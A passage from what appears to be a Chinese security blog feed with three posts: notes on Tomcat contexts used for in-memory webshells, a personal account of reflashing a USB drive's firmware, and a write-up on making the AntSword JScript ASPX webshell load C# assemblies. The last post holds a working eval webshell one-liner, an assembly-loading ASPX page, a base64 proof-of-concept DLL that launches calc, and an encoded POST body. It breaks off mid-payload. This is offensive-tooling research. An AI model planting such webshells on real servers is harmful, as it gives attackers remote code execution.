id="StandardContext">StandardContext</h3><p>StandardContext存在于org.apache.catalina.core.StandardContext。</p><p>实际上研究ApplicationContext的代码会发现，ApplicationContext所实现的方法其实都是调用的this.context中的方法</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1615791333561-80d3e967-f36a-4c49-a611-a329bdf1349b.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1615791389467-3fe1e723-84d1-4e8b-8dfb-8f5712665a6d.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1615791403712-f22001f0-8c10-4bb4-9ab9-7bc1fdbe8650.png" alt="image.png"></p><p>而这个this.context就是一个实例化的StandardContext对象。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1615791137362-cd302e98-fe22-468f-ae9e-4f2085848df3.png" alt="image.png"></p><p>所以在我看来，StandardContext是Tomcat中真正起作用的Context，负责跟Tomcat的底层交互，ApplicationContext其实更像对StandardContext的一种封装。</p><p>用下面这张图来展示一下其中的关系</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1615790929311-f1c15d6e-c317-41c2-9ea7-eadc91a691cf.png" alt="image"></p><p>回过头看内存马。以添加filter为例，从上面的分析我们可以知道ApplicationContext跟Standerdcontext这两个东西都有addFilter的方法。那么实际选用哪一个呢？其实两种办法都可以。三梦师傅在<a href="https://xz.aliyun.com/t/7388" target="_blank" rel="noopener">基于tomcat的内存 Webshell 无文件攻击技术</a>这篇文章里是利用反射修改了Tomcat的LifecycleState，绕过限制条件调用的ApplicationContext中的addFilter方法。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1615795697048-8b5ba421-eb1d-45a9-8084-04127e0484a5.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1615796887459-f6e8da3c-9941-418c-a02e-5d217b199aa6.png" alt="image.png"></p><p>但是因为实际上最终调用的还是StandardContext的addFilter方法，所以我们就可以直接调用StandardContext的addFilter方法进行绕过，从而省去了绕过一堆判断的过程。这种实现具体可以看这个师傅的<a href="https://mp.weixin.qq.com/s/nPAje2-cqdeSzNj4kD2Zgw" target="_blank" rel="noopener">公众号文章</a>。</p>]]></content>
    
    <summary type="html">
    
      关于Tomcat中的三个Context的理解
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>金士顿 DTSE9G2 128G U盘量产踩坑记</title>
    <link href="https://yzddmr6.com/posts/make-usb-great-again/"/>
    <id>https://yzddmr6.com/posts/make-usb-great-again/</id>
    <published>2021-03-02T13:12:19.000Z</published>
    <updated>2021-03-02T14:39:12.292Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="前言">前言</h2><p>买过金士顿U盘的应该都知道一般金士顿是不支持bitlocker的，但是这样又很不方便，就想捣鼓一下。</p><p>从naivekun师傅那里知道了一个词叫量产，通过给U盘刷固件，就可以让U盘被识别为一个CD或者硬盘，从而支持bitlocker。结果折腾了两天。。。踩了各种坑。一开始刷炸了之后128g缩水成32g，然后又捣鼓捣鼓救了回来，反而扩容到了132g？神秘。</p><h2 id="前期准备">前期准备</h2><p>型号：金士顿 DTSE9G2 128G</p><p>工具：ChipGenius</p><p>​ ST-TOOL_9000_v3.7F.92</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614689541756-5362b169-4462-417b-b4f2-d44ccc490832.png" alt="image.png"></p><h2 id="参数设置">参数设置</h2><p>下载工具解压后打开STTOOL_F1_90_v200_00_SZ.exe</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614688151229-50a092b2-09db-427f-aebd-6d2102274ada.png" alt="image.png"></p><p>点击更新识别U盘，然后进入设定</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614689662363-feb2c4a5-ce80-4699-8039-a346515d433b.png" alt="image.png"></p><p>固件档案中选择的是2309_hv3_ED3_T_1P.BIN而不是上文教程中的2309_hv3_ED3_M_1P.BIN。因为猜测M是mlc的意思，T是tlc的意思。ChipGenius中显示U盘是tlc，所以换成了2309_hv3_ED3_T_1P.BIN。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614683892494-b1015522-d629-48ee-ae81-7008806bf949.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614684012623-d50d69a0-003b-4d66-886d-62e347fffb4f.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614684027055-eb205961-d12a-4e78-8c8f-a52684d7c99b.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614684032917-f90006df-a3cd-4ad8-b11e-1020cd1d27d5.png" alt="image.png"></p><p>这里选择容量优先</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614684040144-39e6a18c-637d-492f-b635-1412d646a5f9.png" alt="image.png"></p><p>自己是已经低格一遍了，所以选的高格扫描，分类方式选择容量有限。</p><p>低格一次4-5个小时，高格一次3-5分钟左右。</p><p>因为我的CE是4个就选的4，Capacity是U盘容量大小，我选择的是自动，也可以设置指定大小。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614684053391-17c96e20-72d3-4fdf-a456-fa9f600cf61d.png" alt="image.png"></p><p>搞完后点击保存，返回上个界面。</p><h2 id="坑">坑</h2><h3 id="0x01">0x01</h3><p>量产工具要在本机运行，不要在虚拟机里面运行，否则会提示奇奇怪怪的错误。被坑了好久</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614668632227-037b759a-8621-4177-957c-184e11772896.png" alt="image.png"></p><h3 id="0x02">0x02</h3><p>开始naivekun师傅是按照这个教程来的[<a href="http://bbs.wuyou.net/forum.php?mod=viewthread&amp;tid=417696&amp;extra=&amp;page=1" target="_blank" rel="noopener">教程] 群联PS2251-09(PS2309)U盘量产</a>，刷完之后发现128g缩水到了32g。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614690324324-8c7b51f5-adbb-493d-a0a8-f4c432f1d4b5.png" alt="image.png"></p><p>帖子下面也有人出现了同样的问题</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614687752396-f7b44df1-42a1-4e24-86db-16584babd2a3.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614687777323-22850737-7ba0-447b-acbf-b17a29c0310b.png" alt="image.png"></p><p>64g的没事，128g的就缩水。刚开始以为是CE太多，固件不兼容啥的，后来发现其实是因为工具默认使用的是速度优先策略，会把低速数据块抛弃，才会导致量产后容量变小但是用起来非常顺畅。</p><h3 id="0x03">0x03</h3><p>格完之后不要急着拔U盘，在U盘里新建一个文件再拔，否则再次插入会不识别U盘。神秘</p><h2 id="量产过程">量产过程</h2><p>第一次是选择了低格+高格，贼鸡儿慢。。。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614668605274-d497a6d0-19ff-4916-b47b-e65b912824ce.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614676197893-ba7e74f2-071f-4d76-ad1a-039e1f0fada3.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614679572568-ecfaa77a-0d4d-4d8f-ad6a-540b7999e948.png" alt="image.png"></p><p>完事之后去看设备管理器发现已经量产成功，但是拔出U盘再插入就会无法识别。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614679583008-244d50f7-11c3-43a3-a69a-33ec0a3afd61.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614679638921-0155c412-640c-4385-b6b8-f70d3aacdf32.png" alt="image.png"></p><p>后来用高格又刷了一遍，刚刷完之后没先拔出来，在U盘里新建了一个txt，然后拔出U盘，再次读取，成功识别！</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614688796939-70295c46-4cb4-4065-a845-4ffbbca57955.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614684188015-a9c246de-2e40-4a9a-83ec-fdb333888456.png" alt="image.png"></p><p>但是怎么变成132g了。。。还扩容了呢</p><p>测试一下读写</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614680458215-70378558-68c5-4766-9c7a-722b99bc2df4.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614684204711-1e265145-f084-45f6-816d-0438c28511f2.png" alt="image.png"></p><p>360U盘鉴定一下容量</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614683314738-5a322691-ffea-4bf6-a9ed-3673ebf78190.png" alt="image.png"></p><p>还行吧，预期范围之内</p><p>选中U盘右键，终于出现了bitlocker的选项。。。</p><p>加密驱动器，成功！</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614684982853-e045b1c0-32e3-47e6-ab9b-6df341695b18.png" alt="image.png"></p><h2 id="最后">最后</h2><p>没事还是不要搞量产orz。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;买过金士顿U盘的应该都知道一般金士顿是不支持bitlocker的，但是这样又很不方便，就想捣鼓一下。&lt;/p&gt;&lt;p&gt;从naivekun师傅那里知道了一
      
    
    </summary>
    
    
      <category term="随便写写" scheme="https://yzddmr6.com/categories/%E9%9A%8F%E4%BE%BF%E5%86%99%E5%86%99/"/>
    
    
  </entry>
  
  <entry>
    <title>Jscript加载Assembly踩坑记</title>
    <link href="https://yzddmr6.com/posts/jscript-load-csharp-assembly/"/>
    <id>https://yzddmr6.com/posts/jscript-load-csharp-assembly/</id>
    <published>2021-01-27T08:03:47.000Z</published>
    <updated>2021-01-27T08:05:42.555Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="前言">前言</h2><p>最近想要给As-Exploits增加aspx类型的支持，就研究了一下冰蝎跟哥斯拉的实现。</p><p>由于冰蝎跟哥斯拉都采用的C#类型的shell，所以可以直接调用系统的一些api，并且可以加载任意的shellcode。而蚁剑采用的是传统的Jscript。就想找个办法把它们两者结合起来，用Jscript加载C#的assembly，以此来达到兼容原有shell类型的目的。</p><p>但是在实现的过程中踩了一些坑，所以就写下这篇文章记录一下。</p><h2 id="理论支持">理论支持</h2><h3 id="Assembly">Assembly</h3><p>这里要先提到一个概念叫Assembly，引用一下rebeyond师傅文章中的话：<a href="https://xz.aliyun.com/t/2758" target="_blank" rel="noopener">https://xz.aliyun.com/t/2758</a></p><blockquote><p>在Java中，每个类经过编译之后都单独对应一个class文件，而在.net中则不同，.net中不存在单个类对应的二进制文件，而是引入了一个叫做Assembly（程序集）的概念，已编译的类是以Assembly的形式来承载的，Assembly是供CLR执行的可执行文件。在.NET下，托管的DLL和EXE都称之为Assembly，一个Assembly可以包含多个类。</p></blockquote><p>java跟.net有很多相似之处，这里我们可以简单的理解为：.net中的assembly就像java中的class。java中使用defineClass来加载一个类到jvm内存中，同样，.net中可以使用Assembly.Load来把assembly加载到内存中。</p><h3 id="从Jscript到C">从Jscript到C#</h3><p>蚁剑用的是Jscript，然而冰蝎哥斯拉用的C#，那么能否用Jscript去调用C#呢？</p><p>答案是可以的，<a href="http://xn--4gq603bcz0bbwbp1i.net" target="_blank" rel="noopener">这里附一张.net</a> framework的框架图</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611631244033-5fc17c40-78d4-4345-b999-67d103ece651.png" alt="image"></p><p>可以看到最顶层的如C#,VB,Jscript等语言，他们的底层框架都是通用的，<a href="http://xn--3dsp36ail6a.net" target="_blank" rel="noopener">都是在.net</a> framework这个体系内。所以C#编译成的assembly在Jscript中是可以通用的。</p><p>那么Jscript如何将其加载进去呢？由于其中部分基类库Base Class Library(BCL)是共有的。而Assembly.Load刚好在System.Reflection这个命名空间下面，所以我们就可以在Jscript中调用System.Reflection.Assembly.Load来把C#的assembly加载到内存中。</p><p>这里可能会有同学问了，既然Jscript也是一门独立的语言，理论上C#能实现的他都能实现，为什么还要大费周折再去加载C#呢？</p><p>其实也不是没有想过直接用Jscript写。。。但是在实现的过程中发现太蛋疼了，Jscript基本搜不到什么文档，报错也搜不到，本人测试过VS，VS code，rider，都没有Jscript的补全跟高亮，开发起来非常难受。另外一个原因是很多开源工具都用的C#实现，采用assembly加载的方式稍微修改一下就可以快速复用。</p><h2 id="踩坑过程">踩坑过程</h2><p>前面扯了这么多主要是理论，当然实现中没有这么顺利。</p><p>首先新建一个Class Library项目，这里以弹计算器为例。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">using System.Diagnostics;</span><br><span class="line"></span><br><span class="line">namespace AntPayload</span><br><span class="line">&#123;</span><br><span class="line">    public class Run</span><br><span class="line">    &#123;</span><br><span class="line">        public override bool Equals(object obj)</span><br><span class="line">        &#123;</span><br><span class="line">            Process.Start(&quot;calc.exe&quot;);</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>项目自动编译或者手动编译为dll</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csc /t:library AntPayload.cs</span><br></pre></td></tr></table></figure><p>base64一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 -w 0 AntPayload.dll &gt; AntPayload.txt</span><br></pre></td></tr></table></figure><p>Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAEXJD2AAAAAAAAAAAOAAIiALATAAAAgAAAAGAAAAAAAANicAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAOQmAABPAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAACsJQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAPAcAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIgDAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAYJwAAAAAAAEgAAAACAAUAaCAAAEQFAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADZyAQAAcCgOAAAKJhcqHgIoDwAACioAAEJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAMwBAAAjfgAAOAIAACQCAAAjU3RyaW5ncwAAAABcBAAAFAAAACNVUwBwBAAAEAAAACNHVUlEAAAAgAQAAMQAAAAjQmxvYgAAAAAAAAACAAABRxUAAAkAAAAA+gEzABYAAAEAAAAQAAAAAgAAAAIAAAABAAAADwAAAA0AAAABAAAAAgAAAAAAbgEBAAAAAAAGAN8AzgEGAEwBzgEGACwAnAEPAO4BAAAGAFQAhAEGAMIAhAEGAKMAhAEGADMBhAEGAP8AhAEGABgBhAEGAGsAhAEGAEAArwEGAB4ArwEGAIYAhAEGAAwCfQEKAAQCnAEAAAAAAQAAAAAAAQABAAEAEAAZAhMAPQABAAEAUCAAAAAAxgD9ASkAAQBeIAAAAACGGJYBBgACAAAAAQBqAQkAlgEBABEAlgEGABkAlgEKACkAlgEQADEAlgEQADkAlgEQAEEAlgEQAEkAlgEQAFEAlgEQAFkAlgEQAGEAlgEVAGkAlgEQAHEAlgEQAIEAEwIaAHkAlgEGAC4ACwAuAC4AEwA3AC4AGwBWAC4AIwBfAC4AKwBvAC4AMwBvAC4AOwBvAC4AQwBfAC4ASwB1AC4AUwBvAC4AWwBvAC4AYwCNAC4AawC3AASAAAABAAAAAAAAAAAAAAAAABMAAAACAAAAAAAAAAAAAAAgAAoAAAAAAAIAAAAAAAAAAAAAACAAfQEAAAAAAAAAPE1vZHVsZT4AbXNjb3JsaWIAQW50UGF5bG9hZABHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAG9iagBBbnRQYXlsb2FkLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24ALmN0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAEVxdWFscwBQcm9jZXNzAE9iamVjdABTdGFydABSdW5UZXN0AAAAAAARYwBhAGwAYwAuAGUAeABlAAAADuw7XR6MQkeND6FGq61D8gAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECBQABEkEO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><br></pre></td></tr></table></figure><p>新建web项目，建立test.aspx测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    var Payload =Request.Form(&quot;data&quot;);</span><br><span class="line">    var myAssebly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));</span><br><span class="line">    var myPaylaod=myAssebly.CreateInstance(&quot;AntPayload.Run&quot;).Equals(this);</span><br><span class="line">    myPaylaod.Equals(this);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>POST：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=xxxx(上文中的payload)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611633232056-b2c8ef30-8d5c-4902-b9ed-d0ee60480a78.png" alt="image.png"></p><p>可以证实我们的猜想是成功的，可以用Jscript调用System.Reflection.Assembly.Load执行C#的payload。</p><p>由于蚁剑的aspx一句话是基于jscript的eval的，所以还要通过一层eval给他传进去。</p><p>web项目中新建base.aspx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%eval(Request.Item[&quot;ant&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure><p>POST:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ant=var%20Payload%20%3D%22xxxxxxxxx%22%3B%0Avar%20myAssebly%20%3D%20System.Reflection.Assembly.Load(Convert.FromBase64String(Payload))%3B%0Avar%20myPaylaod%3DmyAssebly.CreateInstance(%22AntPayload.Run%22).Equals(this)%3B%0AmyPaylaod.Equals(this)%3B</span><br></pre></td></tr></table></figure><p>发现第一次是可以正常调用的</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646490580-34f8d7bb-c91d-473c-9364-a8e39e98a277.png" alt="image.png"></p><p>但是第二次执行就会提示下面的错误</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646514517-119e0355-d225-4f92-9ecf-07a57c564ca3.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[A]AntPayload.Run 无法强制转换为 [B]AntPayload.Run。类型 A 源自“AntPayload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null”(在字节数组的上下文“LoadNeither”中)。类型 B 源自“AntPayload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null”(在字节数组的上下文“LoadNeither”中)。</span><br></pre></td></tr></table></figure><p>搜了一下发现没有什么有用的回答，猜测大概是跟java中类重复加载一样的报错。</p><p>所以就加了一层判断，如果当前存在 AntPayload.Run 这个类型的assembly就不重复进行加载。</p><p>新建项目test0.aspx测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> &lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"> var Payload=&quot;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAP2QD2AAAAAAAAAAAOAAIiALATAAAAgAAAAGAAAAAAAAMicAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAOAmAABPAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAACoJQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAOAcAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIgDAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAUJwAAAAAAAEgAAAACAAUAaCAAAEAFAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADZyAQAAcCgOAAAKJhcqHgIoDwAACioAAEJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAMwBAAAjfgAAOAIAACACAAAjU3RyaW5ncwAAAABYBAAAFAAAACNVUwBsBAAAEAAAACNHVUlEAAAAfAQAAMQAAAAjQmxvYgAAAAAAAAACAAABRxUAAAkAAAAA+gEzABYAAAEAAAAQAAAAAgAAAAIAAAABAAAADwAAAA0AAAABAAAAAgAAAAAAbgEBAAAAAAAGAN8A0gEGAEwB0gEGACwAoAEPAPIBAAAGAFQAhAEGAMIAhAEGAKMAhAEGADMBhAEGAP8AhAEGABgBhAEGAGsAhAEGAEAAswEGAB4AswEGAIYAhAEGABACfQEKAAgCoAEAAAAAAQAAAAAAAQABAAEAEACWARMAPQABAAEAUCAAAAAAxgABAikAAQBeIAAAAACGGJoBBgACAAAAAQBqAQkAmgEBAB